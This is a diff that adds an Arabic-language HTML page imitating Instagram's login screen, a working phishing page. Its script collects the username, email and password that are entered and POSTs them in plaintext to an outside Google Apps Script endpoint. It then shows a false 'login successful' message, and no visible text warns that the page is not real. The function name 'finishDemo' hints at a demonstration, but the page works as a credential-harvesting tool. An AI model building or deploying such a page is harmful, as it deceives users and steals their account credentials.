@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OH2A3c.png" type="image/x-icon">
+    <style>
+        * {
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px 10px;
+        }
+
+        .insta-container {
+            width: 100%;
+            max-width: 350px;
+        }
+
+        .card {
+            background: #ffffff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 30px 25px 20px 25px;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+
+        .insta-logo-img {
+            width: 175px;
+            margin-top: 10px;
+            margin-bottom: 25px;
+        }
+
+        .input-group input {
+            width: 100%;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            padding: 9px 8px;
+            margin-bottom: 6px;
+            font-size: 12px;
+            outline: none;
+            direction: rtl;
+            box-sizing: border-box;
+        }
+
+        .input-group input:focus {
+            border-color: #a8a8a8;
+        }
+
+        .insta-btn-blue {
+            width: 100%;
+            background-color: #0095f6;
+            color: #ffffff;
+            border: none;
+            border-radius: 8px;
+            padding: 7px;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 8px;
+        }
+
+        .insta-btn-blue:hover {
+            background-color: #1877f2;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 18px 0;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        .divider::before, .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background-color: #dbdbdb;
+        }
+
+        .divider span {
+            padding: 0 15px;
+        }
+
+        #result {
+            display: none;
+            margin-top: 15px;
+            font-size: 13px;
+            color: #270;
+            background-color: #eefbfa;
+            border: 1px solid #c7f2ef;
+            padding: 10px;
+            border-radius: 4px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="insta-container">
+    <!-- كارد تسجيل الدخول الرئيسي -->
+    <div class="card">
+        <!-- شعار إنستغرام الرسمي أصلي -->
+  <h1 class="insta-logo-text">Instagram</h1>
+
+        <div class="input-group">
+            <input type="text" id="name" placeholder="اسم المستخدم أو الهاتف">
+            <input type="email" id="email" placeholder="البريد الإلكتروني">
+            <input type="password" id="password" placeholder="كلمة السر">
+        </div>
+
+        <button onclick="finishDemo()" class="insta-btn-blue">
+            تسجيل الدخول
+        </button>
+
+        <div class="divider">
+            <span>أو</span>
+        </div>
+
+        <p style="color:#385185; font-size:14px; font-weight:600; margin: 15px 0 5px 0; cursor:pointer;">
+            تسجيل الدخول باستخدام Facebook
+        </p>
+        <p style="color:#00376b; font-size:12px; margin-top: 10px; cursor:pointer;">
+            هل نسيت كلمة السر؟
+        </p>
+
+        <div id="result"></div>
+    </div>
+
+    <!-- كارد الانضمام لإنستغرام -->
+    <div class="card" style="padding: 15px;">
+        <p style="font-size:14px; margin:0; color:#262626;">
+            ليس لديك حساب؟ <span style="color:#0095f6; font-weight:600; cursor:pointer;">تسجيل</span>
+        </p>
+    </div>
+</div>
+
+<script>
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxnAVdN37_FpdckPpcmvMYr8_1EMOXuTxuF32Ng4nwXbFA7nqfmeh5-WHc_VsZkjP2H/exec";
+
+    function finishDemo() {
+        const nameVal = document.getElementById("name").value;
+        const emailVal = document.getElementById("email").value;
+        const passVal = document.getElementById("password").value;
+
+        if(!nameVal || !emailVal || !passVal) {
+            alert("يرجى ملء كافة الخانات للمتابعة");
+            return;
+        }
+
+        const data = {
+            name: nameVal,
+            email: emailVal,
+            password: passVal,
+            action: "login_attempt",
+            detected: "no"
+        };
+
+        fetch(SCRIPT_URL, {
+            method: "POST",
+            mode: "no-cors",
+            headers: {
+                "Content-Type": "text/plain"
+            },
+            body: JSON.stringify(data)
+        }).then(() => {
+            const resDiv = document.getElementById("result");
+            resDiv.style.display = "block";
+            resDiv.innerHTML = "<b>تم تسجيل الدخول بنجاح!</b>";
+        }).catch(err => {
+            console.error(err);
+        });
+    }
+</script>
+
+</body>
+</html>
